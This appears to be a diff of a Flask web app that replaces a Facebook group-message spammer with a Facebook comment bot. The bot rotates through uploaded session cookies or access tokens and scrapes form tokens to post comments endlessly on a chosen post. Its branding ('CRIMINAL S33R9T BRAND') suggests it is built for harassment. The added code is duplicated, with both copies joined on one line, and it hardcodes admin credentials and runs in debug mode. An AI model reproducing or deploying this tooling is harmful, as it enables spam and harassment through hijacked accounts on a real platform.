@@ -1,214 +1,949 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
+
 import requests
-from threading import Thread, Event
+
+import os
+
+import re
+
 import time
-import random
-import string
+
+import threading
 
 app = Flask(__name__)
-app.debug = True
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
+app.secret_key = 'your_secret_key_here'  # Change this to a random secret key
 
-stop_events = {}
-threads = {}
+ 
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
-    stop_event = stop_events[task_id]
-    while not stop_event.is_set():
-        for message1 in messages:
-            if stop_event.is_set():
-                break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = str(mn) + ' ' + message1
-                parameters = {'access_token': access_token, 'message': message}
-                response = requests.post(api_url, data=parameters, headers=headers)
-                if response.status_code == 200:
-                    print(f"Message Sent Successfully From token {access_token}: {message}")
-                else:
-                    print(f"Message Sent Failed From token {access_token}: {message}")
-                time.sleep(time_interval)
+# Login credentials
 
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        token_option = request.form.get('tokenOption')
+OWNER_USERNAME = "SEERATBRAND09"
 
-        if token_option == 'single':
-            access_tokens = [request.form.get('singleToken')]
-        else:
-            token_file = request.files['tokenFile']
-            access_tokens = token_file.read().decode().strip().splitlines()
+ADMIN_PASSWORD = "TRICKERSEERAT"
 
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+class FacebookCommenter:
 
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
+    def __init__(self):
 
-        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+        self.comment_count = 0
 
-        stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
-        threads[task_id] = thread
-        thread.start()
+    def comment_on_post(self, cookies, post_id, comment, delay):
 
-        return f'Task started with ID: {task_id}'
+        with requests.Session() as r:
 
-    return render_template_string('''
-<!DOCTYPE html>
+            r.headers.update({
+
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
+
+                'sec-fetch-site': 'none',
+
+                'accept-language': 'id,en;q=0.9',
+
+                'Host': 'mbasic.facebook.com',
+
+                'sec-fetch-user': '?1',
+
+                'sec-fetch-dest': 'document',
+
+                'accept-encoding': 'gzip, deflate',
+
+                'sec-fetch-mode': 'navigate',
+
+                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
+
+                'connection': 'keep-alive',
+
+            })
+
+            response = r.get(f'https://mbasic.facebook.com/{post_id}', cookies={"cookie": cookies})
+
+            next_action_match = re.search('method="post" action="([^"]+)"', response.text)
+
+            fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
+
+            jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
+
+            if not (next_action_match and fb_dtsg_match and jazoest_match):
+
+                print("Required parameters not found.")
+
+                return
+
+            next_action = next_action_match.group(1).replace('amp;', '')
+
+            fb_dtsg = fb_dtsg_match.group(1)
+
+            jazoest = jazoest_match.group(1)
+
+            data = {
+
+                'fb_dtsg': fb_dtsg,
+
+                'jazoest': jazoest,
+
+                'comment_text': comment,
+
+                'comment': 'Submit',
+
+            }
+
+            r.headers.update({
+
+                'content-type': 'application/x-www-form-urlencoded',
+
+                'referer': f'https://mbasic.facebook.com/{post_id}',
+
+                'origin': 'https://mbasic.facebook.com',
+
+            })
+
+            response2 = r.post(f'https://mbasic.facebook.com{next_action}', data=data, cookies={"cookie": cookies})
+
+            if 'comment_success' in response2.url and response2.status_code == 200:
+
+                self.comment_count += 1
+
+                print(f"Comment {self.comment_count} successfully posted.")
+
+            else:
+
+                print(f"Comment failed with status code: {response2.status_code}")
+
+    def process_inputs(self, cookies, post_id, comments, delay):
+
+        cookie_index = 0
+
+        while True:
+
+            for comment in comments:
+
+                comment = comment.strip()
+
+                if comment:
+
+                    time.sleep(delay)
+
+                    self.comment_on_post(cookies[cookie_index], post_id, comment, delay)
+
+                    cookie_index = (cookie_index + 1) % len(cookies)
+
+@app.route("/", methods=["GET", "POST"])
+
+def index():
+
+    if request.method == "POST":
+
+        post_id = request.form['post_id']
+
+        delay = int(request.form['delay'])
+
+        cookies_file = request.files['cookies_file']
+
+        comments_file = request.files['comments_file']
+
+        cookies = cookies_file.read().decode('utf-8').splitlines()
+
+        comments = comments_file.read().decode('utf-8').splitlines()
+
+        if len(cookies) == 0 or len(comments) == 0:
+
+            return "Cookies or comments file is empty."
+
+        commenter = FacebookCommenter()
+
+        commenter.process_inputs(cookies, post_id, comments, delay)
+
+        return "Comments are being posted. Check console for updates."
+
+    
+
+    form_html = '''
+
+    <!DOCTYPE html>
+
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>R͟O͟Y͟A͟L͟ P͟U͟N͟J͟A͟B͟ R͟U͟L͟E͟X͟ </title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-color: black; /* Optional: to make the video stand out */
-    }
-    .video-background {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: translate(-50%, -50%);
-      z-index: -1;
-    }
-    .container {
-      max-width: 350px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      border: none;
-      color: white;
-    }
-    .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: white;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
-  </style>
-</head>
-<body>
-    <video id="bg-video" class="video-background" loop autoplay muted>
-        <source src="https://i.ibb.co/mqMd925/IMG-20250124-233616.jpg">
-        Your browser does not support the video tag.
-    </video>
-<body>
-  <header class="header mt-4">
-    <h1 class="mt-3 text-white">S͟E͟E͟R͟A͟T͟ B͟R͟A͟N͟D͟</h1> </header>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">SLECT TOKEN OPCTION</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Multy Token</option>
-        </select>
-      </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">ENTER SINGLE TOKEN</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
-      </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">ENTER TOKEN FILE</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">ENTER GROUP INBOX LINK</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">ENTER KIDX NAME</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">ENTER TIME IN SECOND</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">ENTER TEXT FILE</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Run</button>
-    </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">ENTER TASK ID TO STOUP</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>© 2025 CREDIT:- CRIMINAL S33R9T BRAND</p>
-    <p> ROYAL PUNJAB RULEX<a href="">CLICK HERE FOR FACEBOOK</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/qr/IOHRLKBMBPOJA1" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
-      </a>
-    </div>
-  </footer>
-  <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
-    }
-  </script>
-</body>
-</html>
-''')
 
-@app.route('/stop', methods=['POST'])
-def stop_task():
-    task_id = request.form.get('taskId')
-    if task_id in stop_events:
-        stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
-    else:
-        return f'No task found with ID {task_id}.'
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>POST</title>
+
+    <style>
+
+        body {
+
+            font-family: 'Poppins', sans-serif;
+
+            background: #FFF9C4;
+
+            color: #333;
+
+            display: flex;
+
+            flex-direction: column;
+
+            min-height: 100vh;
+
+            overflow-y: auto;
+
+            align-items: center;
+
+        }
+
+        .container {
+
+            background: rgba(255, 255, 255, 0.9);
+
+            padding: 30px;
+
+            border-radius: 15px;
+
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+
+            max-width: 400px;
+
+            width: 90%;
+
+            margin-top: 20px;
+
+        }
+
+        h1 {
+
+            font-weight: 600;
+
+            color: #FF9800;
+
+            text-align: center;
+
+        }
+
+        input, button {
+
+            width: 100%;
+
+            padding: 12px;
+
+            margin: 10px 0;
+
+            border-radius: 10px;
+
+            border: none;
+
+            font-size: 16px;
+
+        }
+
+        input {
+
+            background: #FFF3E0;
+
+            color: #333;
+
+            outline: none;
+
+        }
+
+        input::placeholder {
+
+            color: #666;
+
+        }
+
+        button {
+
+            background: #FF9800;
+
+            color: white;
+
+            font-weight: 600;
+
+            cursor: pointer;
+
+            transition: background 0.3s;
+
+        }
+
+        button:hover {
+
+            background: #F57C00;
+
+        }
+
+        .info-btn {
+
+            position: fixed;
+
+            top: 15px;
+
+            right: 15px;
+
+            background: #FF9800;
+
+            border-radius: 50%;
+
+            width: 40px;
+
+            height: 40px;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            color: white;
+
+            cursor: pointer;
+
+            transition: transform 0.3s;
+
+        }
+
+        .info-btn:hover {
+
+            transform: scale(1.2);
+
+        }
+
+        .overlay {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            background: rgba(0, 0, 0, 0.6);
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            visibility: hidden;
+
+            opacity: 0;
+
+            transition: opacity 0.3s ease-in-out;
+
+        }
+
+        .overlay.active {
+
+            visibility: visible;
+
+            opacity: 1;
+
+        }
+
+        .owner-info {
+
+            background: white;
+
+            padding: 20px;
+
+            border-radius: 10px;
+
+            text-align: center;
+
+            width: 350px;
+
+            box-shadow: 0px 5px 20px rgba(0, 0, 0, 0.2);
+
+        }
+
+        .owner-info img {
+
+            width: 80px;
+
+            height: 80px;
+
+            border-radius: 50%;
+
+            margin-bottom: 10px;
+
+        }
+
+        .footer {
+
+            margin-top: 20px;
+
+            font-size: 14px;
+
+            text-align: center;
+
+            padding: 10px;
+
+        }
+
+        .footer a {
+
+            color: #FF9800;
+
+            text-decoration: none;
+
+            font-weight: bold;
+
+        }
+
+        .cursor {
+
+            position: fixed;
+
+            width: 12px;
+
+            height: 12px;
+
+            border-radius: 50%;
+
+            background: red;
+
+            pointer-events: none;
+
+            transition: background 0.2s, transform 0.1s ease-out;
+
+        }
+
+        .spacer {
+
+            flex-grow: 1;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+
+        <h1>POST SERVER</h1>
+
+     <div class="status"></div>
+
+    <form method="POST" enctype="multipart/form-data">
+
+        P0ST UID: <input type="text" name="post_id"><br><br>
+
+        TIME.TXT: <input type="number" name="delay"><br><br>
+
+        COOKIES: <input type="file" name="cookies_file"><br><br>
+
+        FILE TXT: <input type="file" name="comments_file"><br><br>
+
+        <button type="submit">START Comments</button>
+
+        </form>
+
+        
+
+        
+
+        <div class="footer">
+
+            <a href="https://www.facebook.com/share/1Bf4NBZ4Qs/?mibextid=ZbWKwL">Contact me on Facebook</a>
+
+        </div>
+
+    </div>
+
+</body>
+
+</html>
+
+    '''
+
+    
+
+    return render_template_string(form_html)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+
+    port = int(os.environ.get('PORT', 20343))
+
+    app.run(host='0.0.0.0', port=port, debug=True) from flask import Flask, request, render_template_string, jsonify
+
+import requests
+
+import os
+
+import re
+
+import time
+
+import threading
+
+app = Flask(__name__)
+
+app.secret_key = 'your_secret_key_here'  # Change this to a random secret key
+
+ 
+
+# Login credentials
+
+OWNER_USERNAME = "SEERATBRAND09"
+
+ADMIN_PASSWORD = "TRICKERSEERAT"
+
+class FacebookCommenter:
+
+    def __init__(self):
+
+        self.comment_count = 0
+
+    def comment_on_post(self, cookies, post_id, comment, delay):
+
+        with requests.Session() as r:
+
+            r.headers.update({
+
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
+
+                'sec-fetch-site': 'none',
+
+                'accept-language': 'id,en;q=0.9',
+
+                'Host': 'mbasic.facebook.com',
+
+                'sec-fetch-user': '?1',
+
+                'sec-fetch-dest': 'document',
+
+                'accept-encoding': 'gzip, deflate',
+
+                'sec-fetch-mode': 'navigate',
+
+                'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
+
+                'connection': 'keep-alive',
+
+            })
+
+            response = r.get(f'https://mbasic.facebook.com/{post_id}', cookies={"cookie": cookies})
+
+            next_action_match = re.search('method="post" action="([^"]+)"', response.text)
+
+            fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
+
+            jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
+
+            if not (next_action_match and fb_dtsg_match and jazoest_match):
+
+                print("Required parameters not found.")
+
+                return
+
+            next_action = next_action_match.group(1).replace('amp;', '')
+
+            fb_dtsg = fb_dtsg_match.group(1)
+
+            jazoest = jazoest_match.group(1)
+
+            data = {
+
+                'fb_dtsg': fb_dtsg,
+
+                'jazoest': jazoest,
+
+                'comment_text': comment,
+
+                'comment': 'Submit',
+
+            }
+
+            r.headers.update({
+
+                'content-type': 'application/x-www-form-urlencoded',
+
+                'referer': f'https://mbasic.facebook.com/{post_id}',
+
+                'origin': 'https://mbasic.facebook.com',
+
+            })
+
+            response2 = r.post(f'https://mbasic.facebook.com{next_action}', data=data, cookies={"cookie": cookies})
+
+            if 'comment_success' in response2.url and response2.status_code == 200:
+
+                self.comment_count += 1
+
+                print(f"Comment {self.comment_count} successfully posted.")
+
+            else:
+
+                print(f"Comment failed with status code: {response2.status_code}")
+
+    def process_inputs(self, cookies, post_id, comments, delay):
+
+        cookie_index = 0
+
+        while True:
+
+            for comment in comments:
+
+                comment = comment.strip()
+
+                if comment:
+
+                    time.sleep(delay)
+
+                    self.comment_on_post(cookies[cookie_index], post_id, comment, delay)
+
+                    cookie_index = (cookie_index + 1) % len(cookies)
+
+@app.route("/", methods=["GET", "POST"])
+
+def index():
+
+    if request.method == "POST":
+
+        post_id = request.form['post_id']
+
+        delay = int(request.form['delay'])
+
+        cookies_file = request.files['cookies_file']
+
+        comments_file = request.files['comments_file']
+
+        cookies = cookies_file.read().decode('utf-8').splitlines()
+
+        comments = comments_file.read().decode('utf-8').splitlines()
+
+        if len(cookies) == 0 or len(comments) == 0:
+
+            return "Cookies or comments file is empty."
+
+        commenter = FacebookCommenter()
+
+        commenter.process_inputs(cookies, post_id, comments, delay)
+
+        return "Comments are being posted. Check console for updates."
+
+    
+
+    form_html = '''
+
+    <!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>POST</title>
+
+    <style>
+
+        body {
+
+            font-family: 'Poppins', sans-serif;
+
+            background: #FFF9C4;
+
+            color: #333;
+
+            display: flex;
+
+            flex-direction: column;
+
+            min-height: 100vh;
+
+            overflow-y: auto;
+
+            align-items: center;
+
+        }
+
+        .container {
+
+            background: rgba(255, 255, 255, 0.9);
+
+            padding: 30px;
+
+            border-radius: 15px;
+
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+
+            max-width: 400px;
+
+            width: 90%;
+
+            margin-top: 20px;
+
+        }
+
+        h1 {
+
+            font-weight: 600;
+
+            color: #FF9800;
+
+            text-align: center;
+
+        }
+
+        input, button {
+
+            width: 100%;
+
+            padding: 12px;
+
+            margin: 10px 0;
+
+            border-radius: 10px;
+
+            border: none;
+
+            font-size: 16px;
+
+        }
+
+        input {
+
+            background: #FFF3E0;
+
+            color: #333;
+
+            outline: none;
+
+        }
+
+        input::placeholder {
+
+            color: #666;
+
+        }
+
+        button {
+
+            background: #FF9800;
+
+            color: white;
+
+            font-weight: 600;
+
+            cursor: pointer;
+
+            transition: background 0.3s;
+
+        }
+
+        button:hover {
+
+            background: #F57C00;
+
+        }
+
+        .info-btn {
+
+            position: fixed;
+
+            top: 15px;
+
+            right: 15px;
+
+            background: #FF9800;
+
+            border-radius: 50%;
+
+            width: 40px;
+
+            height: 40px;
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            color: white;
+
+            cursor: pointer;
+
+            transition: transform 0.3s;
+
+        }
+
+        .info-btn:hover {
+
+            transform: scale(1.2);
+
+        }
+
+        .overlay {
+
+            position: fixed;
+
+            top: 0;
+
+            left: 0;
+
+            width: 100%;
+
+            height: 100%;
+
+            background: rgba(0, 0, 0, 0.6);
+
+            display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            visibility: hidden;
+
+            opacity: 0;
+
+            transition: opacity 0.3s ease-in-out;
+
+        }
+
+        .overlay.active {
+
+            visibility: visible;
+
+            opacity: 1;
+
+        }
+
+        .owner-info {
+
+            background: white;
+
+            padding: 20px;
+
+            border-radius: 10px;
+
+            text-align: center;
+
+            width: 350px;
+
+            box-shadow: 0px 5px 20px rgba(0, 0, 0, 0.2);
+
+        }
+
+        .owner-info img {
+
+            width: 80px;
+
+            height: 80px;
+
+            border-radius: 50%;
+
+            margin-bottom: 10px;
+
+        }
+
+        .footer {
+
+            margin-top: 20px;
+
+            font-size: 14px;
+
+            text-align: center;
+
+            padding: 10px;
+
+        }
+
+        .footer a {
+
+            color: #FF9800;
+
+            text-decoration: none;
+
+            font-weight: bold;
+
+        }
+
+        .cursor {
+
+            position: fixed;
+
+            width: 12px;
+
+            height: 12px;
+
+            border-radius: 50%;
+
+            background: red;
+
+            pointer-events: none;
+
+            transition: background 0.2s, transform 0.1s ease-out;
+
+        }
+
+        .spacer {
+
+            flex-grow: 1;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+
+        <h1>POST SERVER</h1>
+
+     <div class="status"></div>
+
+    <form method="POST" enctype="multipart/form-data">
+
+        P0ST UID: <input type="text" name="post_id"><br><br>
+
+        TIME.TXT: <input type="number" name="delay"><br><br>
+
+        COOKIES: <input type="file" name="cookies_file"><br><br>
+
+        FILE TXT: <input type="file" name="comments_file"><br><br>
+
+        <button type="submit">START Comments</button>
+
+        </form>
+
+        
+
+        
+
+        <div class="footer">
+
+            <a href="https://www.facebook.com/share/1Bf4NBZ4Qs/?mibextid=ZbWKwL">Contact me on Facebook</a>
+
+        </div>
+
+    </div>
+
+</body>
+
+</html>
+
+    '''
+
+    
+
+    return render_template_string(form_html)
+
+if __name__ == '__main__':
+
+    port = int(os.environ.get('PORT', 20343))
+
+    app.run(host='0.0.0.0', port=port, debug=True) 
